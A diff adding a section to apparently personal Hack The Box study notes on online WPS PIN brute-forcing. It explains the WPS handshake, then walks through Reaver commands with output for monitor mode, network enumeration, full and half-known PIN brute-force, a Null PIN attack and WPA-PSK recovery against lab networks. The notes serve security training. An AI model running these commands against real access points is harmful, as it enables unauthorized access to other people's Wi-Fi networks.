@@ -207,3 +207,179 @@ When attempting to test WPS, you want to note the following conditions:
 - Max PIN Attempts Locking
 	- If the access point locks after a few incorrectly guessed PINs, you likely will not be able to get through all 11,000 possible combinations
 
+## Online PIN Brute-Forcing Attacks
+
+### Overview
+
+One of the ways that you can attempt to retrieve the correct WPS pin for a target network is through online PIN brute-forcing. This can be conducted with a few different tools, but popularly it is done with either Reaver or Bully.
+
+Online brute-forcing works by trying all possible digit combinations and sending them to the access point for verification. By doing this, you go through the series of EAP messages for each possible PIN. In the M4 message, the client sends the access point the R-Hash1 and R-Hash2 values, along with the R-S1 nonce values encrypted with AES. During this message, the access point computes the received R-Hash1 and R-Hash2 values to verify if the PIN you sent is correct. If it is, the remaining messages are exchanged. If it is not, you receive a NACK.
+
+In online brute-forcing attacks, you already know some values and generate others. These are as follows:
+
+- You know the PKe and generate the PKr yourselves. This allows you to generate the proper response for the R-Hash1 and R-Hash2 values.
+- You generate the R-S1 and R-S2 nonce values yourselves.
+- You receive the E-Hash1 and E-Hash2 values from the access point during the M3 message.
+
+However, during these attacks you do not know:
+
+- The true PIN. You guess this through the 11,000 combinations.
+- The E-S2 and E-S2 nonce values. You receive these from the access point in the M5 and M7 message. Of course, only if you guess the PIN correctly.
+- The WPA-PSK. This is the resulting succes during the M7 message upon guessing the correct PIN.
+
+Due to you not knowing either of the 128-bit E-S1 and E-S2 nonce values, and the fact that they are random, you are left guessing the PIN. However, these are not always randomly generated. Depending on the vendor, you might be able to employ the usage of an offline pixie dust attack to retrieve the WPA-PSK.
+
+### [Reaver](https://github.com/t6x/reaver-wps-fork-t6x)
+
+... is an excellent tool for conducting online password cracking attempts. It offers various options, including Null PIN attacks, custom PIN associations, Pixie Dust Attacks, and general brute-forcing.
+
+```bash
+reaver -i [interface] -b [BSSID] -c [channel]
+```
+
+| **Option** | **Description**                                       |
+| ---------- | ----------------------------------------------------- |
+| `-i`       | Name of the monitor-mode interface to use             |
+| `-b`       | BSSID of the target AP                                |
+| `-c`       | Set the 802.11 channel for the interface              |
+| `-p`       | Use the specified pin                                 |
+| `-d`       | Set the delay between pin attempts                    |
+| `-l`       | Set the time to wait if the AP locks WPS pin attempts |
+| `-g`       | Quit after num pin attempts                           |
+| `-r`       | Sleep for y seconds every x pin attempts              |
+| `-t`       | Set the receive timeout period                        |
+| `-L`       | Ignore locked state reported by the target AP         |
+| `-K, -Z`   | Run pixiedust attack                                  |
+| `-O`       | Write packets of interest into pcap file              |
+
+#### Brute-Forcing WPS PIN
+
+To begin, you need to enable monitor mode. You can use the `iw` command to add a new interface named `mon0` and set its type to monitor mode, as demonstrated below. Due to a known bug, setting the interface to monitor mode using `airmon-ng` can cause Reaver to malfunction. Therefore, it is recommended to use the `iw` command for this purpose.
+
+```bash
+d41y@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor
+
+d41y@htb[/htb]$ ifconfig mon0 up
+
+d41y@htb[/htb]$ iwconfig
+
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+wlan0     IEEE 802.11  ESSID:off/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:on
+```
+
+Once you've added an interface with monitor mode enabled, you can use `airodump-ng` to enumerate WPS enabled Wi-Fi networks.
+
+```bash
+d41y@htb[/htb]$ airodump-ng mon0 --wps
+
+ CH  8 ][ Elapsed: 0 s ][ 2024-06-26 10:06 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID
+
+ AE:EB:B0:11:A0:1E  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    HackMe   
+ B2:A5:1D:E1:B2:11  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    GammerZone
+ 5A:1A:59:B7:E7:97  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    Teddy      
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+```
+
+Now you can start brute-forcing using Reaver. To begin, you need to specify the interface with the `-i` argument, the BSSID with the `-b` argument, and the channel with the `-c` argument. Reaver will then automatically begin brute-forcing every possible PIN, which totals in 11,000 possible PINs.
+
+```bash
+d41y@htb[/htb]$ reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1 
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from AE:EB:B0:11:A0:1E
+[+] Received beacon from AE:EB:B0:11:A0:1E
+[!] Found packet with bad FCS, skipping...
+[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
+[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
+[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
+[+] WPS PIN: '96457896'
+[+] WPA PSK: '<SNIP>'
+[+] AP SSID: 'HackMe'
+```
+
+#### Brute-Forcing using Half Known WPS PIN
+
+If you know the first four digits of the WPS PIN, you can use Reaver to brute-force the remaining four digits. You can provide the known half PIN using the `-p` option followed by the first four digits.
+
+```bash
+d41y@htb[/htb]$ reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from B2:A5:1D:E1:B2:11
+[+] Received beacon from B2:A5:1D:E1:B2:11
+[!] Found packet with bad FCS, skipping...
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] 90.91% complete @ 2024-06-21 11:32:33 (0 seconds/pin)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] 91.48% complete @ 2024-06-21 11:34:23 (1 seconds/pin)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
+[+] WPS PIN: '12345678'
+[+] WPA PSK: '<SNIP>'
+[+] AP SSID: 'GammerZone'
+```
+
+#### Testing for Null PIN
+
+Suppose neither of these succeed, you could also attempt a Null PIN attack. Some access points are vulnerable to Null PIN attacks and will even disclose the WPA-PSK when no PIN is sent. You can do so by employing the following command, specifying the Null PIN with `-p ""` or `-p " "`.
+
+```bash
+d41y@htb[/htb]$ reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 5A:1A:59:B7:E7:97
+[+] Received beacon from 5A:1A:59:B7:E7:97
+[!] Found packet with bad FCS, skipping...
+[+] Associated with 5A:1A:59:B7:E7:97 (ESSID: Teddy)
+[+] WPS PIN: ' '
+[+] WPA PSK: '<SNIP>'
+[+] AP SSID: 'Teddy'
+```
+
+#### Retrieving WPA-PSK using Reaver with a Known PIN
+
+If one of your brute-forcing attempts succeeds, you can use the following command to verify the captured PIN. In this command, `-p` specifies the PIN, and `-b` specifies the BSSID of the target Wi-Fi network:
+
+```bash
+d41y@htb[/htb]$ sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197
+
+<snip>
+[+] Pin Cracked in 5 seconds
+[+] WPS PIN: '88766197'
+[+] WPS PSK: 'WPS-Attacks'
+[+] AP SSID: 'HTB-Wireless'
+```
+
+Alternatively, if the AP has a label with the PIN physically printed on the backside of the router, you can use this information to retrieve the WPA-PSK for the Wi-Fi network. This method leverages the default PIN provided by the manufacturer to potentially gain access to the network. For the technique of using the PIN printed on the label to retrieve the WPA-PSK, the AP must be in label mode.
+
